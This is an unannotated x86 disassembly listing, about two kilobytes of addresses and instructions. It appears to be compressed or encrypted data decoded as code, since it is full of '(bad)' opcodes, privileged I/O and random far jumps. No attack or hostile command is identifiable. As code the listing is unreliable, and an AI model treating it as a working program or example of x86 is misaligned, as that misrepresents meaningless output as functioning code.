  41b631:	xor    eax,0xfcff7b41
  41b636:	int3   
  41b637:	adc    ebx,DWORD PTR [ecx+0x5d]
  41b63a:	sub    eax,0x8c6e07e0
  41b63f:	xlat   BYTE PTR ds:[ebx]
  41b640:	nop
  41b641:	or     eax,0xf72480f7
  41b646:	repnz leave 
  41b648:	int    0x43
  41b64a:	gs call 0x63ed:0x2cd36200
  41b652:	out    dx,eax
  41b653:	inc    edx
  41b654:	call   0xe749:0x85276e49
  41b65b:	mov    ebx,0xc83fb60a
  41b660:	aas    
  41b661:	add    edx,edi
  41b663:	icebp  
  41b664:	jnp    0x41b609
  41b666:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b667:	frstor [edi]
  41b669:	bound  ebp,QWORD PTR [eax+0x4354c7a5]
  41b66f:	sub    eax,DWORD PTR [ecx-0x26]
  41b672:	dec    ebx
  41b673:	cmp    BYTE PTR [ecx],dl
  41b675:	fisttp DWORD PTR [ecx]
  41b677:	int    0x41
  41b679:	mov    dl,0x73
  41b67b:	cdq    
  41b67c:	test   DWORD PTR [edi-0x52],esi
  41b67f:	call   0xf55aee91
  41b684:	xchg   esi,eax
  41b685:	fist   WORD PTR [ecx+0x1ccb19db]
  41b68b:	lea    eax,[edx+ecx*8-0x57bf645f]
  41b692:	lea    esp,[edx-0x5e]
  41b695:	mov    ds,edi
  41b697:	imul   edi,esi,0x82e01f7a
  41b69d:	adc    ecx,esp
  41b69f:	pop    es
  41b6a0:	std    
  41b6a1:	mov    DWORD PTR [edi-0x16],edi
  41b6a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6a5:	daa    
  41b6a6:	lock das 
  41b6a8:	cld    
  41b6a9:	xchg   ebx,eax
  41b6aa:	sbb    DWORD PTR [esi+ebx*4-0x5f],edi
  41b6ae:	(bad)  
  41b6af:	cmp    eax,0x3900f2ab
  41b6b4:	xor    edi,ebx
  41b6b6:	lahf   
  41b6b7:	xchg   ebx,eax
  41b6b8:	std    
  41b6b9:	or     BYTE PTR [edx],ah
  41b6bb:	or     al,0xef
  41b6bd:	mov    bh,0xca
  41b6bf:	mov    al,0x67
  41b6c1:	aas    
  41b6c2:	sub    cl,bh
  41b6c4:	out    dx,al
  41b6c5:	mov    cl,0x98
  41b6c7:	je     0x41b714
  41b6c9:	xchg   ebp,eax
  41b6ca:	jne    0x41b685
  41b6cc:	pop    ecx
  41b6cd:	pop    ebx
  41b6ce:	aaa    
  41b6cf:	in     al,dx
  41b6d0:	je     0x41b6c8
  41b6d2:	jb     0x41b748
  41b6d4:	das    
  41b6d5:	inc    esp
  41b6d6:	nop
  41b6d7:	div    BYTE PTR [ebx+0x9d14beb]
  41b6dd:	fcmovnbe st,st(6)
  41b6df:	add    bl,BYTE PTR [eax+0x48]
  41b6e2:	shl    DWORD PTR [ebx],0xf5
  41b6e5:	cwde   
  41b6e6:	push   eax
  41b6e7:	sub    eax,0x53398f47
  41b6ec:	mov    esi,ecx
  41b6ee:	sub    DWORD PTR [ecx-0x2eb51087],ebx
  41b6f4:	fdiv   DWORD PTR [ecx]
  41b6f6:	pop    ebp
  41b6f7:	(bad)  
  41b6f8:	fst    DWORD PTR [edi+0x7a]
  41b6fb:	sub    DWORD PTR [ecx+0x46fd3b61],0x7122864e
  41b705:	pop    ebx
  41b706:	retf   
  41b707:	dec    esi
  41b708:	xchg   edi,eax
  41b709:	lea    ebx,[esi-0x67]
  41b70c:	out    0xfc,al
  41b70e:	inc    ebp
  41b70f:	inc    esi
  41b710:	clc    
  41b711:	xchg   ecx,eax
  41b712:	es xor eax,0x7c40db85
  41b718:	push   ecx
  41b719:	dec    eax
  41b71a:	push   ds
  41b71b:	pop    ds
  41b71c:	jmp    0x41b761
  41b71e:	mov    ch,0xd3
  41b720:	mov    cl,0x2a
  41b722:	and    eax,0x92ce3902
  41b727:	sub    al,0xba
  41b729:	mov    BYTE PTR [esp+edx*8-0x65aefd6b],ch
  41b730:	cmp    ecx,eax
  41b732:	mov    BYTE PTR [esp+edx*1+0x25],dl
  41b736:	inc    BYTE PTR [eax]
  41b738:	mov    dl,0x68
  41b73a:	shr    esi,0x5d
  41b73d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b73e:	(bad)  
  41b73f:	xlat   BYTE PTR ds:[ebx]
  41b740:	cmp    al,0xf3
  41b742:	or     esi,DWORD PTR [bx]
  41b745:	add    eax,0xbe23001
  41b74a:	xor    al,0x85
  41b74c:	inc    ebp
  41b74d:	in     eax,0xa9
  41b74f:	fidivr WORD PTR [esi]
  41b751:	enter  0x1925,0xb5
  41b755:	adc    DWORD PTR [edx-0x2cc7cd08],edx
  41b75b:	push   ebp
  41b75c:	xchg   ecx,eax
  41b75d:	mov    edx,0xb6b99195
  41b762:	and    bh,dh
  41b764:	in     eax,dx
  41b765:	cmp    BYTE PTR [ebx],bl
  41b767:	mov    bh,0xc4
  41b769:	pop    eax
  41b76a:	je     0x41b791
  41b76c:	sub    ebx,eax
  41b76e:	adc    DWORD PTR [edi+ebx*2],ebx
  41b771:	ds push 0xffffffdc
  41b774:	xor    al,0x5f
  41b776:	retf   0xa4d7
  41b779:	dec    ebp
  41b77a:	jbe    0x41b71b
  41b77c:	jno    0x41b76f
  41b77e:	cld    
  41b77f:	mov    dl,0x4b
  41b781:	and    BYTE PTR [ecx-0x67],ah
  41b784:	mov    WORD PTR [ebp+0x75],gs
  41b787:	add    eax,0x49291156
  41b78c:	push   edi
  41b78d:	call   0x70c02392
  41b792:	cs pop eax
  41b794:	mov    eax,ds:0xc0f1a90a
  41b799:	mov    al,ds:0xeaeae2e2
  41b79e:	sbb    esp,DWORD PTR [ecx-0x5d]
  41b7a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7a2:	xchg   ebp,eax
  41b7a3:	inc    ebx
  41b7a4:	ror    ebx,cl
  41b7a6:	inc    ebx
  41b7a7:	jb     0x41b7e1
  41b7a9:	cmovs  edi,DWORD PTR [edi+0x63ffb12b]
  41b7b0:	pop    ebx
  41b7b1:	(bad)  
  41b7b2:	fistp  QWORD PTR [ebp+0x4129428f]
  41b7b8:	(bad)  
  41b7b9:	cmp    BYTE PTR [esi+0x1c],dl
  41b7bc:	and    DWORD PTR [ebx-0x53],edx
  41b7bf:	scas   eax,DWORD PTR es:[edi]
  41b7c0:	dec    DWORD PTR [ecx]
  41b7c2:	sub    edx,ecx
  41b7c4:	dec    esi
  41b7c5:	add    al,0xbd
  41b7c7:	enter  0x6221,0xd6
  41b7cb:	rol    esp,0x35
  41b7ce:	or     edi,DWORD PTR [esi+0x37]
  41b7d1:	xchg   DWORD PTR gs:[esi],esp
  41b7d4:	call   0x8b96:0x69ac853f
  41b7db:	cli    
  41b7dc:	jb     0x41b79c
  41b7de:	push   0x21
  41b7e0:	pop    edx
  41b7e1:	inc    ebp
  41b7e2:	sub    BYTE PTR [edx-0xeeb769b],dh
  41b7e8:	rcl    DWORD PTR [ebp+0x2f31af6e],0x54
  41b7ef:	dec    ecx
  41b7f0:	and    cl,BYTE PTR [ecx+0x6f]
  41b7f3:	dec    edi
  41b7f4:	aas    
  41b7f5:	(bad)  
  41b7f6:	push   ebp
  41b7f7:	ss jo  0x41b793
  41b7fa:	or     dh,BYTE PTR [edi+edi*4-0x3fc2f9c1]
  41b801:	jae    0x41b80c
  41b803:	dec    esp
  41b804:	bound  esi,QWORD PTR [eax+edi*8]
  41b807:	addr16 mov esi,0x5c49b745
  41b80d:	and    eax,0x998da060
  41b812:	mov    esp,0xae03cfa0
  41b817:	pop    ebx
  41b818:	fs jmp 0x22646472
  41b81e:	inc    edi
  41b81f:	ins    BYTE PTR es:[edi],dx
  41b820:	(bad)  
  41b822:	icebp  
  41b823:	int    0x62
  41b825:	xchg   ebp,eax
  41b826:	test   DWORD PTR [ecx+0x1d207309],ebp
  41b82c:	sbb    esi,esi
  41b82e:	push   ebx
  41b82f:	or     BYTE PTR [eax+0x77],dl
  41b832:	add    BYTE PTR [ebx-0x10560c9b],dl
  41b838:	jl     0x41b88b
  41b83a:	push   ebp
  41b83b:	mov    al,ds:0x2cdb6f45
  41b840:	pop    ecx
  41b841:	sub    esi,DWORD PTR [edi+0x63]
  41b844:	mov    dl,BYTE PTR [eax+0x5e1c9825]
  41b84a:	test   al,0x30
  41b84c:	lds    ecx,FWORD PTR [edi-0x5]
  41b84f:	daa    
  41b850:	shr    BYTE PTR [ebx*1+0x36cff63],0xf4
  41b858:	jmp    0x452c4ac7
  41b85d:	mov    eax,0xffe365aa
  41b862:	adc    BYTE PTR [esi+0x5c327ec4],al
  41b868:	not    ebx
  41b86a:	ins    BYTE PTR es:[edi],dx
  41b86b:	dec    ebx
  41b86c:	and    esi,DWORD PTR [esi+0x3b]
  41b86f:	dec    ebp
  41b870:	shr    DWORD PTR [edx+0x7639e6d6],1
  41b876:	push   ss
  41b877:	lods   eax,DWORD PTR ds:[esi]
  41b878:	arpl   WORD PTR [ebx+0x411c1d13],ax
  41b87e:	cmp    ah,BYTE PTR [ebp+0x77]
  41b881:	xchg   esp,eax
  41b883:	mov    ds:0x62535f09,al
  41b888:	scas   eax,DWORD PTR es:[edi]
  41b889:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b88a:	cmc    
  41b88b:	dec    ebp
  41b88c:	ss sbb al,0x5a
  41b88f:	mov    ebx,0xbfd3a851
  41b894:	mov    bl,0x9b
  41b896:	cli    
  41b897:	adc    BYTE PTR [esi+ecx*1-0x63],cl
  41b89b:	mov    ah,0xb6
  41b89d:	aaa    
  41b89e:	int3   
  41b89f:	sub    al,0xab
  41b8a1:	out    dx,al
  41b8a2:	outs   dx,DWORD PTR ds:[esi]
  41b8a3:	mov    BYTE PTR [eax],al
  41b8a5:	sbb    eax,DWORD PTR [eax-0x59d869bc]
  41b8ab:	pop    ss
  41b8ac:	aaa    
  41b8ad:	mov    ds,WORD PTR [eax+0x37]
  41b8b0:	hlt    
  41b8b1:	xchg   al,cl
  41b8b3:	sbb    bh,BYTE PTR [ecx+ecx*2+0x4679f0ed]
  41b8ba:	sub    al,BYTE PTR [edi-0x5fc1e086]
  41b8c0:	jle    0x41b867
  41b8c2:	mov    esp,0xc031c50c
  41b8c7:	lock popa 
  41b8c9:	xor    BYTE PTR [edx+0x5c0765ea],bh
  41b8cf:	dec    esi
  41b8d0:	ror    DWORD PTR [esi+edi*2],cl
  41b8d3:	into   
  41b8d4:	push   ebx
  41b8d5:	mov    ecx,0x5b05377a
  41b8da:	mov    eax,ds:0x519616f5
  41b8df:	shl    bl,0xdf
  41b8e2:	aad    0x9a
  41b8e4:	repz jne 0x41b935
  41b8e7:	sub    al,0x19
  41b8e9:	or     DWORD PTR [edi-0x7affc144],edi
  41b8ef:	loopne 0x41b8f3
  41b8f1:	mov    ah,0x89
  41b8f3:	inc    eax
  41b8f4:	and    dl,BYTE PTR [edx+0x4a]
  41b8f7:	dec    edi
  41b8f8:	jmp    0x41b970
  41b8fa:	add    al,0xc0
  41b8fc:	xor    DWORD PTR [ecx],ebp
  41b8fe:	jns    0x5c569a9b
  41b904:	bound  ebp,QWORD PTR [ecx-0x4402cda7]
  41b90a:	mov    ebx,0xe814c0da
  41b90f:	sbb    edi,DWORD PTR [edi-0x31]
  41b912:	dec    ebp
  41b913:	jp     0x41b953
  41b915:	xor    eax,0x32da00f1
  41b91a:	mov    WORD PTR [edx+0x3eca60f],?
  41b920:	mov    al,ds:0xd942b4db
  41b925:	fistp  WORD PTR [ecx]
  41b927:	xor    al,0x5f
  41b929:	stos   BYTE PTR es:[edi],al
  41b92a:	aaa    
  41b92b:	es std 
  41b92d:	call   0x9e27:0xb253162a
  41b934:	jmp    0xd91:0xdac03cbe
  41b93b:	ret    0x14d3
  41b93e:	xor    BYTE PTR gs:[ecx],cl
  41b941:	outs   dx,DWORD PTR ds:[esi]
  41b942:	push   ss
  41b943:	jmp    0xa4ff:0x49c5a67f
  41b94a:	sbb    eax,0xe5be817e
  41b94f:	and    DWORD PTR [eax-0x4c],esi
  41b952:	add    ch,BYTE PTR [ecx+0x20]
  41b955:	mov    edx,0xe04e2a38
  41b95a:	cmp    ch,cl
  41b95c:	xlat   BYTE PTR ds:[ebx]
  41b95d:	shl    DWORD PTR [ecx],cl
  41b95f:	jle    0x41b90b
  41b961:	mov    ebx,DWORD PTR [esi]
  41b963:	mov    BYTE PTR [edi+edi*1+0x28],dl
  41b967:	and    eax,0x6cdd8f24
  41b96c:	jno    0x41b92f
  41b96e:	hlt    
  41b96f:	xor    DWORD PTR [ebp+0x42],ebx
  41b972:	jmp    0x7e3bb3f0
  41b977:	xchg   ebp,eax
  41b978:	lods   al,BYTE PTR ds:[esi]
  41b979:	cmc    
  41b97a:	xchg   ebx,eax
  41b97b:	push   ebx
  41b97c:	jae    0x41b92b
  41b97e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b97f:	push   esi
  41b980:	lods   al,BYTE PTR ds:[esi]
  41b981:	cwde   
  41b982:	aaa    
  41b983:	clc    
  41b984:	xor    BYTE PTR [ecx+0x14b9f30d],cl
  41b98a:	shr    DWORD PTR ds:0x3aaaeae8,cl
  41b990:	shl    ecx,0xc9
  41b993:	mov    ds:0x64f67d46,eax
  41b998:	loopne 0x41ba17
  41b99a:	mov    esp,0x946cde09
  41b99f:	popa   
  41b9a0:	add    ch,BYTE PTR [esp+eiz*4-0x7aa77fa7]
  41b9a7:	adc    al,0xfd
  41b9a9:	adc    al,BYTE PTR [edi+0x20143ad2]
  41b9af:	daa    
  41b9b0:	pop    ds
  41b9b1:	(bad)  
  41b9b2:	fdivp  st(5),st
  41b9b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b9b5:	in     al,dx
  41b9b6:	add    dh,BYTE PTR [edx]
  41b9b8:	adc    ch,BYTE PTR [esi]
  41b9ba:	fstp   DWORD PTR [edi]
  41b9bc:	sbb    al,0x78
  41b9be:	add    edi,eax
  41b9c0:	and    eax,0x1de6ae4e
  41b9c5:	aam    0xd6
  41b9c7:	outs   dx,DWORD PTR ds:[esi]
  41b9c8:	cmc    
  41b9c9:	dec    edi
  41b9ca:	pop    esp
  41b9cb:	jnp    0x41b980
  41b9cd:	xor    BYTE PTR [ecx+ecx*8+0x6a],ah
  41b9d1:	in     al,dx
  41b9d2:	inc    ebp
  41b9d3:	add    BYTE PTR [eax],bl
  41b9d5:	ds or  al,0x6f
  41b9d8:	lock pop ss
  41b9da:	stos   BYTE PTR es:[edi],al
  41b9db:	xor    eax,0x522ddb42
  41b9e0:	pop    ebx
  41b9e1:	out    0x40,eax
  41b9e3:	mov    dl,0x5
  41b9e5:	push   ds
  41b9e6:	cmp    DWORD PTR [ecx+0x65982ed8],esp
  41b9ec:	outs   dx,DWORD PTR ds:[esi]
  41b9ed:	nop
  41b9ee:	js     0x41b9a0
  41b9f0:	jb     0x41b9ac
  41b9f2:	push   edx
  41b9f3:	pop    ecx
  41b9f4:	int3   
  41b9f5:	stos   DWORD PTR es:[edi],eax
  41b9f6:	cwde   
  41b9f7:	and    dh,cl
  41b9f9:	push   ebx
  41b9fa:	jns    0x41ba74
  41b9fc:	inc    ecx
  41b9fd:	push   esi
  41b9fe:	inc    al
  41ba00:	cmp    DWORD PTR [ebx+edx*4+0x5ecaeca0],0xffffffb3
  41ba08:	aad    0x1b
  41ba0a:	lods   eax,DWORD PTR ds:[esi]
  41ba0b:	scas   eax,DWORD PTR es:[edi]
  41ba0c:	push   0x14
  41ba0e:	mov    edx,0x2875bf30
  41ba13:	mov    eax,ds:0xd8348dbf
  41ba18:	add    dh,BYTE PTR [ecx-0x71]
  41ba1b:	add    eax,0xb23d5320
  41ba20:	stc    
  41ba21:	adc    eax,0xee062031
  41ba26:	rcl    DWORD PTR [edx+0x3c],1
  41ba29:	inc    eax
  41ba2a:	cmp    BYTE PTR [ecx-0x44697749],bl
  41ba30:	mov    esi,0x9c8fa725
  41ba35:	push   edx
  41ba36:	push   esi
  41ba37:	ds inc esp
  41ba39:	clc    
  41ba3a:	leave  
  41ba3b:	scas   eax,DWORD PTR es:[edi]
  41ba3c:	stos   DWORD PTR es:[edi],eax
  41ba3d:	add    esp,DWORD PTR [edx]
  41ba3f:	xor    dh,BYTE PTR [edi+0x7d]
  41ba42:	not    BYTE PTR [edi+0x1e]
  41ba45:	mov    ebx,0x9aa8694
  41ba4a:	daa    
  41ba4b:	inc    ebx
  41ba4c:	xchg   esi,eax
  41ba4d:	out    dx,al
  41ba4e:	push   eax
  41ba4f:	mov    dh,0xe4
  41ba51:	and    al,0xd0
  41ba53:	dec    ecx
  41ba54:	mov    si,0x8be2
  41ba58:	inc    esp
  41ba59:	pushf  
  41ba5a:	mov    BYTE PTR [ecx-0x74],bh
  41ba5d:	xchg   ebx,eax
  41ba5e:	xchg   edi,eax
  41ba5f:	mov    edx,0x6944717c
  41ba64:	adc    dh,BYTE PTR [ebp-0x75]
  41ba67:	jp     0x41ba20
  41ba69:	cmp    eax,0x159ba64
  41ba6e:	push   ds
  41ba6f:	add    BYTE PTR [esi-0x18b87786],bl
  41ba75:	pop    edi
  41ba76:	xchg   ebp,eax
  41ba77:	imul   esi,ecx,0xffffff93
  41ba7a:	cwde   
  41ba7b:	mov    edi,0xf2b265bc
  41ba80:	ror    DWORD PTR [edx-0x7f],cl
  41ba83:	sub    al,0x96
  41ba85:	clc    
  41ba86:	mov    WORD PTR [edi],?
  41ba88:	hlt    
  41ba89:	ret    
  41ba8a:	in     eax,0x6b
  41ba8c:	jecxz  0x41ba7c
  41ba8e:	loope  0x41ba70
  41ba90:	push   cs
  41ba91:	adc    eax,0xb7f8faf2
  41ba96:	div    DWORD PTR [ebx]
  41ba98:	outs   dx,BYTE PTR es:[esi]
  41ba9a:	mov    cl,0x9a
  41ba9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba9d:	mov    ebp,0x88af3efb
  41baa2:	outs   dx,DWORD PTR ds:[esi]
  41baa3:	push   ebp
  41baa4:	push   ebp
  41baa5:	and    BYTE PTR [esi+0x2acba6f1],0x7
  41baac:	cmp    eax,0x2f841c20
  41bab1:	(bad)  
  41bab2:	xchg   ecx,eax
  41bab3:	push   es
  41bab4:	push   esi
  41bab5:	scas   al,BYTE PTR es:[edi]
  41bab6:	jecxz  0x41bb1a
  41bab8:	sub    DWORD PTR [esi+edi*8],0xffffff91
  41babc:	mov    edi,0x9bd8bcec
  41bac1:	adc    eax,0xbe401c6f
  41bac6:	rol    DWORD PTR ds:0x41e525cb,0xa5
  41bacd:	sub    eax,0xd258f30d
  41bad2:	xor    eax,DWORD PTR [eax]
  41bad4:	rol    BYTE PTR [edi],cl
  41bad6:	cmp    dl,BYTE PTR [ecx+0x56]
  41bad9:	inc    edx
  41bada:	sub    BYTE PTR [ebx+0x20],ch
  41badd:	xchg   edx,eax
  41bade:	rcr    BYTE PTR [esi-0x36],1
  41bae1:	into   
  41bae2:	mov    ah,0x7a
  41bae4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bae5:	sahf   
  41bae6:	fsub   DWORD PTR [edi]
  41bae8:	enter  0xeda7,0xc1
  41baec:	xchg   ebp,eax
  41baed:	pop    ebx
  41baee:	jg     0x41bac6
  41baf0:	mov    DWORD PTR [esi],ecx
  41baf2:	jae    0x41bb61
  41baf4:	pushf  
  41baf5:	and    DWORD PTR [esi],ebx
  41baf7:	(bad)  [esi]
  41baf9:	nop
  41bafa:	lahf   
  41bafb:	lock or esi,edx
  41bafe:	and    BYTE PTR [edi+0x5b],ch
  41bb01:	leave  
  41bb02:	ins    BYTE PTR es:[edi],dx
  41bb03:	(bad)  
  41bb07:	rol    DWORD PTR [ebx],1
  41bb09:	out    dx,al
  41bb0a:	push   edi
  41bb0b:	aam    0x37
  41bb0d:	sti    
  41bb0e:	daa    
  41bb0f:	mov    WORD PTR [esp+eiz*2],?
  41bb12:	xor    BYTE PTR [edx+0x38],0x5e
  41bb16:	leave  
  41bb17:	ss sbb ebx,edx
  41bb1a:	sub    BYTE PTR [edi+0x70b5f714],al
  41bb20:	in     al,0xf4
  41bb22:	out    dx,eax
  41bb23:	add    ah,BYTE PTR [edx-0x6c50794c]
  41bb29:	xchg   esi,eax
  41bb2a:	xor    esp,DWORD PTR [edi-0x4a1cbd9b]
  41bb30:	ja     0x41bae7
  41bb32:	mov    bh,BYTE PTR [edi-0x1cf1630]
  41bb38:	ja     0x41bb85
  41bb3a:	aas    
  41bb3b:	mov    ds:0xd96c55a5,eax
  41bb40:	repnz sar DWORD PTR [ebx-0x6816f9ce],1
  41bb47:	dec    ebx
  41bb48:	jb     0x41bba5
  41bb4a:	int    0x72
  41bb4c:	inc    esi
  41bb4d:	push   ds
  41bb4e:	in     al,0x6c
  41bb50:	lods   eax,DWORD PTR ds:[esi]
  41bb51:	aam    0x9c
  41bb53:	or     edi,ecx
  41bb55:	out    dx,al
  41bb56:	int3   
  41bb57:	in     eax,0x2
  41bb59:	addr16 mov ebx,edi
  41bb5c:	test   esi,0xd6a08ffe
  41bb62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb63:	cdq    
  41bb64:	add    eax,0x86319a0d
  41bb69:	fst    QWORD PTR [ebx+0x1ca5f3bc]
  41bb6f:	dec    ebx
  41bb70:	in     eax,0xf9
  41bb72:	xor    eax,0xf9bcb0c9
  41bb77:	sub    edi,DWORD PTR [edi+0x25]
  41bb7a:	pop    ebp
  41bb7b:	bound  ebx,QWORD PTR [ebx-0x359d44ad]
  41bb81:	fidiv  WORD PTR [esi+0xe]
  41bb84:	inc    ecx
  41bb85:	mov    ?,WORD PTR [ecx]
  41bb87:	and    DWORD PTR [ebp-0x1c164d8],ebx
  41bb8d:	cmp    bl,ah
  41bb8f:	push   0xcc8b1aac
  41bb94:	or     esp,ecx
  41bb96:	and    al,0x6b
  41bb98:	lods   al,BYTE PTR ds:[esi]
  41bb99:	sti    
  41bb9a:	fs sub eax,0xeea02ba0
  41bba0:	popa   
  41bba1:	adc    DWORD PTR [esi],ecx
  41bba3:	cmc    
  41bba4:	mov    edi,0x1869a091
  41bba9:	jnp    0x41bb72
  41bbab:	xchg   esp,eax
  41bbac:	scas   eax,DWORD PTR es:[edi]
  41bbad:	mov    cl,0xcc
  41bbaf:	xor    al,0x46
  41bbb1:	jg     0x41bb9d
  41bbb3:	push   es
  41bbb4:	dec    ebp
  41bbb5:	sub    ah,BYTE PTR [edi-0x3b]
  41bbb8:	sub    DWORD PTR [edi+0x71],0xfa869d16
  41bbbf:	sub    eax,0xf01b3d37
  41bbc4:	rcr    DWORD PTR [eax+0x5e],0x48
  41bbc8:	cmp    al,BYTE PTR [edx+0x56]
  41bbcb:	adc    esp,ecx
  41bbcd:	aam    0xb9
  41bbcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbd0:	xchg   ebp,eax
  41bbd1:	jmp    0x5e751c51
  41bbd6:	dec    edi
  41bbd7:	std    
  41bbd8:	inc    ecx
  41bbd9:	or     bl,ch
  41bbdb:	lods   al,BYTE PTR ds:[esi]
  41bbdc:	or     DWORD PTR [edx+0x14],esp
  41bbdf:	xor    eax,0xd55e5fc9
  41bbe4:	nop
  41bbe5:	xchg   DWORD PTR [edi+0x64],ebp
  41bbe8:	adc    bl,dh
  41bbea:	shl    BYTE PTR [esp+eiz*4+0x59261e7b],1
  41bbf1:	xchg   esp,eax
  41bbf2:	stos   DWORD PTR es:[edi],eax
  41bbf3:	mov    dh,0xd7
  41bbf5:	cmp    bh,BYTE PTR [eax+eax*8-0x6980b26b]
  41bbfc:	mov    DWORD PTR [eax],0xce9a7b6b
  41bc02:	rcr    BYTE PTR [ebp-0x2634c5b5],cl
  41bc08:	mov    dh,0x42
  41bc0a:	xchg   esp,ebx
  41bc0c:	and    eax,0x9c8a8661
  41bc11:	hlt    
  41bc12:	cmc    
  41bc13:	ror    DWORD PTR [ebx],0x23
  41bc16:	je     0x41bc77
  41bc18:	in     al,dx
  41bc19:	imul   BYTE PTR [edi]
  41bc1b:	xlat   BYTE PTR ds:[ebx]
  41bc1c:	inc    esp
  41bc1d:	rcl    edi,cl
  41bc1f:	mov    ?,edx
  41bc21:	enter  0x1b8d,0xae
  41bc25:	or     dl,0x1e
  41bc28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bc29:	xchg   ebx,eax
  41bc2a:	inc    eax
  41bc2b:	mov    al,0xfa
  41bc2d:	mov    bh,0xbb
  41bc2f:	xor    bh,BYTE PTR [esi]
  41bc31:	stc    
  41bc32:	sub    bl,cl
  41bc34:	push   eax
  41bc35:	dec    edi
  41bc36:	into   
  41bc37:	mov    ch,0x12
  41bc39:	push   esp
  41bc3a:	xor    eax,0xab428cb
  41bc3f:	(bad)  
  41bc40:	stos   BYTE PTR es:[edi],al
  41bc41:	mov    eax,0x866272e
  41bc46:	inc    edi
  41bc47:	xchg   ecx,eax
  41bc48:	push   es
  41bc49:	cdq    
  41bc4a:	mov    bh,0x20
  41bc4c:	popa   
  41bc4d:	sub    eax,0xbf313b80
  41bc52:	nop
  41bc53:	sbb    ch,BYTE PTR [ebp-0x55]
  41bc56:	jg     0x41bc95
  41bc58:	inc    edx
  41bc59:	inc    eax
  41bc5a:	sub    dl,BYTE PTR [edi]
  41bc5c:	or     bh,bh
  41bc5e:	pop    ds
  41bc5f:	xor    cl,0x7e
  41bc62:	cmp    eax,0x6d578322
  41bc67:	loop   0x41bc80
  41bc69:	xchg   esi,eax
  41bc6a:	mov    al,0x46
  41bc6c:	(bad)  
  41bc6d:	retf   0x407c
  41bc70:	stos   BYTE PTR es:[edi],al
  41bc71:	jae    0x41bc96
  41bc73:	icebp  
  41bc74:	sub    BYTE PTR [eax-0x67b4a38a],0x34
  41bc7b:	and    ecx,ebx
  41bc7d:	fcomp  DWORD PTR [edx]
  41bc7f:	(bad)  
  41bc80:	leave  
  41bc81:	int    0x25
  41bc83:	xchg   ecx,eax
  41bc84:	mov    eax,ds:0x26c331a8
  41bc89:	test   al,0xc1
  41bc8b:	rcr    eax,0x3b
  41bc8e:	add    DWORD PTR [eax-0x32],esi
  41bc91:	dec    ebx
  41bc92:	rcl    bl,1
  41bc94:	pop    ebp
  41bc95:	pop    edi
  41bc96:	dec    ebx
  41bc97:	or     esi,eax
  41bc99:	sub    ch,BYTE PTR [ebx-0x708af941]
  41bc9f:	stos   BYTE PTR es:[edi],al
  41bca0:	adc    edx,DWORD PTR ds:0xc24ee542
  41bca6:	js     0x41bc40
  41bca8:	push   es
  41bca9:	pop    es
  41bcaa:	mov    al,ds:0xc72248ef
  41bcaf:	push   eax
  41bcb0:	xchg   DWORD PTR [esi+edx*8-0x5a076be9],edx
  41bcb7:	(bad)  
  41bcb9:	xor    eax,0xc104be33
  41bcbe:	outs   dx,DWORD PTR ds:[esi]
  41bcbf:	gs test eax,0x80de9764
  41bcc5:	shr    bh,1
  41bcc7:	dec    esi
  41bcc8:	popf   
  41bcc9:	mov    al,0x40
  41bccb:	mov    ecx,0x4bbea678
  41bcd0:	sub    al,0x58
  41bcd2:	xchg   DWORD PTR [ebp-0x3da62c72],eax
  41bcd8:	sub    al,0xf9
  41bcda:	repz pop ecx
  41bcdc:	mov    eax,0x706b9d10
  41bce1:	pop    edi
  41bce2:	arpl   sp,bx
  41bce4:	imul   ecx,DWORD PTR [eax],0x1a
  41bce7:	xor    eax,0xc006f290
  41bcec:	fbld   TBYTE PTR [esi+0x78]
  41bcef:	mov    eax,ds:0x85f7e657
  41bcf4:	fdivr  st,st(6)
  41bcf6:	sub    al,BYTE PTR ds:0xe3d49c51
  41bcfc:	mov    dh,0x28
  41bcfe:	xor    al,0xef
  41bd00:	icebp  
  41bd01:	repz (bad) 
  41bd03:	fwait
  41bd04:	cmovge esi,DWORD PTR [esi]
  41bd07:	lahf   
  41bd08:	dec    ebp
  41bd09:	cmp    bl,al
  41bd0b:	lds    esi,FWORD PTR [esi+0x3f]
  41bd0e:	mov    DWORD PTR [ebx],edi
  41bd10:	popa   
  41bd11:	sub    DWORD PTR [esi],esp
  41bd13:	test   DWORD PTR [ecx-0x5c2ad920],esi
  41bd19:	fisub  WORD PTR [ebp+0x60]
  41bd1c:	xchg   edi,eax
  41bd1d:	pop    eax
  41bd1e:	mov    eax,0x6baaa447
  41bd23:	lock xchg DWORD PTR [edx-0x54],eax
  41bd27:	stc    
  41bd28:	dec    edi
  41bd29:	and    BYTE PTR [edx-0x30e120e0],bh
  41bd2f:	xchg   ebx,eax
  41bd30:	jg     0x41bd75
  41bd32:	out    0x29,al
  41bd34:	xchg   ecx,eax
  41bd35:	test   eax,0xe2ec881d
  41bd3a:	jmp    0x2b02:0xf8c2518d
  41bd41:	mov    ah,0x1b
  41bd43:	test   al,0x88
  41bd45:	imul   ecx,DWORD PTR [ebx-0x1f],0x45aead0c
  41bd4c:	into   
  41bd4d:	mov    ch,0xfa
  41bd4f:	xchg   edi,eax
  41bd50:	mov    ecx,0x5fba02fd
  41bd55:	jle    0x41bd43
  41bd57:	ja     0x41bd46
  41bd59:	push   ecx
  41bd5a:	or     ecx,DWORD PTR [esi+0xb9cf82e]
  41bd60:	add    BYTE PTR [ebx+0x1b],0x21
  41bd64:	sbb    al,0x4c
  41bd66:	inc    edi
  41bd67:	inc    ecx
  41bd68:	xlat   BYTE PTR ds:[ebx]
  41bd69:	jmp    0x41bcff
  41bd6b:	or     DWORD PTR [esi-0x4f],eax
  41bd6e:	out    0xde,al
  41bd70:	push   cs
  41bd71:	add    DWORD PTR [esi-0x26],esi
  41bd74:	(bad)
  41bd77:	shr    BYTE PTR [eax],1
  41bd79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
